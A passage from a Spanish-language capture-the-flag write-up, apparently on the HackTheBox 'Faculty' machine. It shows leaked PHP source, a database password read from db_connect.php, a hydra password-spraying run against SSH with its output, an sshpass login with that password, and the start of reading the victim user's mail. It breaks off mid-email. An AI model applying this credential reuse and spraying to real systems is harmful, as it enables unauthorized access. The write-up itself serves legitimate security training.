</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    border: unset;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    font-size: 27px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    top: 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#viewer_modal .modal-dialog {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        width: 80%;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    max-width: unset;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    height: calc(90%);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    max-height: unset;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  #viewer_modal .modal-content {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">       background: black;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    border: unset;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    height: calc(100%);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    display: flex;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    align-items: center;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    justify-content: center;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  #viewer_modal img,#viewer_modal video{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    max-height: calc(100%);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    max-width: calc(100%);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/style&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	&lt;?php include &#39;topbar.php&#39; ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	&lt;?php include &#39;navbar.php&#39; ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;div class=&#34;toast&#34; id=&#34;alert_toast&#34; role=&#34;alert&#34; aria-live=&#34;assertive&#34; aria-atomic=&#34;true&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;div class=&#34;toast-body text-white&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;main id=&#34;view-panel&#34; &gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;?php $page = isset($_GET[&#39;page&#39;]) ? $_GET[&#39;page&#39;] :&#39;home&#39;; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $valid_pages = array(&#34;home&#34;, &#34;courses&#34;, &#34;subjects&#34;, &#34;faculty&#34;, &#34;schedule&#34;, &#34;users&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $page = in_array($page, $valid_pages) ? $page : &#39;home&#39;; ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;?php include $page.&#39;.php&#39; ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;/main&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;div id=&#34;preloader&#34;&gt;&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;a href=&#34;#&#34; class=&#34;back-to-top&#34;&gt;&lt;i class=&#34;icofont-simple-up&#34;&gt;&lt;/i&gt;&lt;/a&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;div class=&#34;modal fade&#34; id=&#34;uni_modal&#34; role=&#39;dialog&#39;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;div class=&#34;modal-dialog modal-md&#34; role=&#34;document&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;modal-content&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;modal-header&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;h5 class=&#34;modal-title&#34;&gt;&lt;/h5&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;modal-body&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;modal-footer&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;button type=&#34;button&#34; class=&#34;btn btn-primary&#34; id=&#39;submit&#39; onclick=&#34;$(&#39;#uni_modal form&#39;).submit()&#34;&gt;Save&lt;/button&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;button type=&#34;button&#34; class=&#34;btn btn-secondary&#34; data-dismiss=&#34;modal&#34;&gt;Cancel&lt;/button&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;div class=&#34;modal fade&#34; id=&#34;confirm_modal&#34; role=&#39;dialog&#39;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;div class=&#34;modal-dialog modal-md&#34; role=&#34;document&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;modal-content&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;modal-header&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;h5 class=&#34;modal-title&#34;&gt;Confirmation&lt;/h5&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;modal-body&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;div id=&#34;delete_content&#34;&gt;&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;modal-footer&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;button type=&#34;button&#34; class=&#34;btn btn-primary&#34; id=&#39;confirm&#39; onclick=&#34;&#34;&gt;Continue&lt;/button&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;button type=&#34;button&#34; class=&#34;btn btn-secondary&#34; data-dismiss=&#34;modal&#34;&gt;Close&lt;/button&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;div class=&#34;modal fade&#34; id=&#34;viewer_modal&#34; role=&#39;dialog&#39;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;div class=&#34;modal-dialog modal-md&#34; role=&#34;document&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;modal-content&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              &lt;button type=&#34;button&#34; class=&#34;btn-close&#34; data-dismiss=&#34;modal&#34;&gt;&lt;span class=&#34;fa fa-times&#34;&gt;&lt;/span&gt;&lt;/button&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              &lt;img src=&#34;&#34; alt=&#34;&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	 window.start_load = function(){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $(&#39;body&#39;).prepend(&#39;&lt;di id=&#34;preloader2&#34;&gt;&lt;/di&gt;&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  window.end_load = function(){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $(&#39;#preloader2&#39;).fadeOut(&#39;fast&#39;, function() {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $(this).remove();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      })
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> window.viewer_modal = function($src = &#39;&#39;){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    start_load()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    var t = $src.split(&#39;.&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    t = t[1]
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if(t ==&#39;mp4&#39;){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      var view = $(&#34;&lt;video src=&#39;&#34;+$src+&#34;&#39; controls autoplay&gt;&lt;/video&gt;&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }else{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      var view = $(&#34;&lt;img src=&#39;&#34;+$src+&#34;&#39; /&gt;&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $(&#39;#viewer_modal .modal-content video,#viewer_modal .modal-content img&#39;).remove()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $(&#39;#viewer_modal .modal-content&#39;).append(view)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $(&#39;#viewer_modal&#39;).modal({
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            show:true,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            backdrop:&#39;static&#39;,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            keyboard:false,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            focus:true
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          })
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          end_load()  
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  window.uni_modal = function($title = &#39;&#39; , $url=&#39;&#39;,$size=&#34;&#34;){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    start_load()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $.ajax({
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        url:$url,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        error:err=&gt;{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            console.log()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            alert(&#34;An error occured&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        },
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        success:function(resp){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if(resp){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $(&#39;#uni_modal .modal-title&#39;).html($title)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $(&#39;#uni_modal .modal-body&#39;).html(resp)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if($size != &#39;&#39;){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $(&#39;#uni_modal .modal-dialog&#39;).addClass($size)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }else{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $(&#39;#uni_modal .modal-dialog&#39;).removeAttr(&#34;class&#34;).addClass(&#34;modal-dialog modal-md&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $(&#39;#uni_modal&#39;).modal({
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                  show:true,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                  backdrop:&#39;static&#39;,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                  keyboard:false,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                  focus:true
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                })
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                end_load()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    })
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">window._conf = function($msg=&#39;&#39;,$func=&#39;&#39;,$params = []){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     $(&#39;#confirm_modal #confirm&#39;).attr(&#39;onclick&#39;,$func+&#34;(&#34;+$params.join(&#39;,&#39;)+&#34;)&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     $(&#39;#confirm_modal .modal-body&#39;).html($msg)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     $(&#39;#confirm_modal&#39;).modal(&#39;show&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">   window.alert_toast= function($msg = &#39;TEST&#39;,$bg = &#39;success&#39;){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $(&#39;#alert_toast&#39;).removeClass(&#39;bg-success&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $(&#39;#alert_toast&#39;).removeClass(&#39;bg-danger&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $(&#39;#alert_toast&#39;).removeClass(&#39;bg-info&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $(&#39;#alert_toast&#39;).removeClass(&#39;bg-warning&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if($bg == &#39;success&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $(&#39;#alert_toast&#39;).addClass(&#39;bg-success&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if($bg == &#39;danger&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $(&#39;#alert_toast&#39;).addClass(&#39;bg-danger&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if($bg == &#39;info&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $(&#39;#alert_toast&#39;).addClass(&#39;bg-info&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if($bg == &#39;warning&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $(&#39;#alert_toast&#39;).addClass(&#39;bg-warning&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $(&#39;#alert_toast .toast-body&#39;).html($msg)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $(&#39;#alert_toast&#39;).toast({delay:3000}).toast(&#39;show&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  $(document).ready(function(){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $(&#39;#preloader&#39;).fadeOut(&#39;fast&#39;, function() {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $(this).remove();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      })
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  })
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  $(&#39;.datetimepicker&#39;).datetimepicker({
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      format:&#39;Y/m/d H:i&#39;,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      startDate: &#39;+3d&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  })
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  $(&#39;.select2&#39;).select2({
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    placeholder:&#34;Please select here&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    width: &#34;100%&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  })
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/script&gt;	
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
</span></span></span></code></pre></div><p>De este archivo podemos comprobar el archivo <code>topbar.php</code></p>
<p>Podemos saltar al archivo <code>manage_user.php</code>
<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
<p>Y en este archivo vemos que se incluye un archivo <code>db_connect.php</code> que probablemente tenga credenciales de base de datos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;db_connect.php&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;id&#39;</span>])){
</span></span><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> $conn<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;SELECT * FROM users where id =&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mysql_real_escape_string</span>($_GET[<span style="color:#e6db74">&#39;id&#39;</span>]));
</span></span></code></pre></div><p><code>db_connect.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$conn<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#e6db74">&#39;sched&#39;</span>,<span style="color:#e6db74">&#39;Co.met06aci.dly53ro.per&#39;</span>,<span style="color:#e6db74">&#39;scheduling_db&#39;</span>)<span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Could not connect to mysql&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mysqli_error</span>($con));
</span></span></code></pre></div><p>Y con <code>hydra</code> podemos hacer password spraying a todos los usuarios..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hydra -L users.txt -p <span style="color:#e6db74">&#39;Co.met06aci.dly53ro.per&#39;</span> 10.129.227.208 ssh
</span></span><span style="display:flex;"><span>Hydra v9.4 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2024-08-12 13:25:17
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">6</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">6</span> tasks, <span style="color:#ae81ff">6</span> login tries <span style="color:#f92672">(</span>l:6/p:1<span style="color:#f92672">)</span>, ~1 try per task
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.129.227.208:22/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.129.227.208   login: gbyolo   password: Co.met06aci.dly53ro.per
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2024-08-12 13:25:20
</span></span></code></pre></div><p>Y podemos acceder por SSH como el usuario <code>gbyolo</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sshpass -p <span style="color:#e6db74">&#39;Co.met06aci.dly53ro.per&#39;</span> ssh gbyolo@10.129.227.208
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-121-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System information as of Mon Aug <span style="color:#ae81ff">12</span> 11:26:43 CEST <span style="color:#ae81ff">2024</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System load:           0.03
</span></span><span style="display:flex;"><span>  Usage of /:            75.2% of 4.67GB
</span></span><span style="display:flex;"><span>  Memory usage:          36%
</span></span><span style="display:flex;"><span>  Swap usage:            0%
</span></span><span style="display:flex;"><span>  Processes:             <span style="color:#ae81ff">226</span>
</span></span><span style="display:flex;"><span>  Users logged in:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.129.227.208
</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> eth0: dead:beef::250:56ff:fe94:8329
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>You have mail.
</span></span><span style="display:flex;"><span>gbyolo@faculty:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>gbyolo<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>gbyolo<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>gbyolo<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>La flag de usuario no está en el directorio personal de trabajo de <code>gbyolo</code> así que supongo que deberemos migrar al usuario <code>developer</code></p>
<h1 id="user-pivoting">User Pivoting</h1>
<p>Si revisamos los mails de este usuario, encontramos un mail de <code>developer</code> diciendo que tenemos acceso para gestionar los repositorios git del grupo de la facultad</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gbyolo@faculty:/home$ mail
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;/var/mail/gbyolo&#34;</span>: <span style="color:#ae81ff">1</span> message <span style="color:#ae81ff">1</span> unread
</span></span><span style="display:flex;"><span>&gt;U   <span style="color:#ae81ff">1</span> developer@faculty. Tue Nov <span style="color:#ae81ff">10</span> 15:03  16/623   Faculty group
</span></span><span style="display:flex;"><span>? 
</span></span><span style="display:flex;"><span>Return-Path: &lt;developer@faculty.htb&gt;
</span></span><span style="display:flex;"><span>X-Original-To: gbyolo@faculty.htb
</span></span><span style="display:flex;"><span>Delivered-To: gbyolo@faculty.htb
</span></span><span style="display:flex;"><span>Received: by faculty.htb <span style="color:#f92672">(</span>Postfix, from userid 1001<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>	id 0399E26125A; Tue, <span style="color:#ae81ff">10</span> Nov <span style="color:#ae81ff">2020</span> 15:03:02 +0100 <span style="color:#f92672">(</span>CET<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Subject: Faculty group
